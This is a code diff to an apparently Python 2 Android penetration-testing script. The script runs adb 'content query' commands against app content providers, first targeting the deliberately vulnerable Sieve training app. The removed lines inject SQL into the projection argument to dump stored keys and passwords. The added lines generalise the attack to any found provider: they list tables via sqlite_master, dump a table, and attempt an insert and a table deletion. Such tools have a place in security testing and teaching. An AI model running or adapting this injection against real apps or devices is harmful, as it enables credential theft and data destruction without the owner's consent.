@@ -218,21 +218,36 @@ file containing the intents:  "))
                 print_menu()
             else:
         #get all contents providers
+	#com.mwr.example.sieve-1
                 contents=get_apks(devices_list, packages.strip())
-                print contents 
-                select_key="'* FROM Key;--'"
-                select_pass="'quote(password) FROM Passwords;--'"
-                command_get_key="shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " + select_key; 
-                command_get_pass="shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " + select_pass; 
-        #get keys
-                print command_get_key
-                print "KEY and User  ";
-                print run_inadb(devices_list[0], command_get_key)
-                #get password
-                print command_get_pass
-                print "Passowords  ";
-                print run_inadb(devices_list[0], command_get_pass)
+		print "CONTENTS"
+                print contents
+		table=contents[0].split("/")
+		table_path_name=table[len(table)-1]
+		print "\n"+"PROJECTION" +"\n"
+		projection_query="shell content query --uri " + contents[0] + " --projection " + '"' "* FROM sqlite_master WHERE type='table';--" + '"'
+		print "adb " + projection_query + "\n"
+		print run_inadb(devices_list[0],projection_query) + "\n"
+		query="shell content query --uri " + contents[0] + " --projection '* FROM "+table_path_name +";--'"
+		print run_inadb(devices_list[0],query)+ "\n"
+		print "TRY INSERT"+"\n"
+		insert=insert_query(devices_list[0],contents[0],table_path_name)
+		if insert: 
+			print "INSERT VALUE FAILED" + "\n"
+		else:
+			print "INSERT VALUE SUCCEEDED" + "\n"
+		
+		query="shell content query --uri " + contents[0] + " --projection '* FROM "+table_path_name +";--'"
+		print run_inadb(devices_list[0],query)+"\n"
+		print "TRY DELETE"+"\n"
+		delete=delete_query(devices_list[0],contents[0],table_path_name)
+		if delete: 
+			print "DELETE TABLE SUCCEEDED" + "\n"
+		else:
+			print "DELETE TABLE FAILED" + "\n"
+
             loop = False
+
 
         #option 7
         elif (choice == "7"):
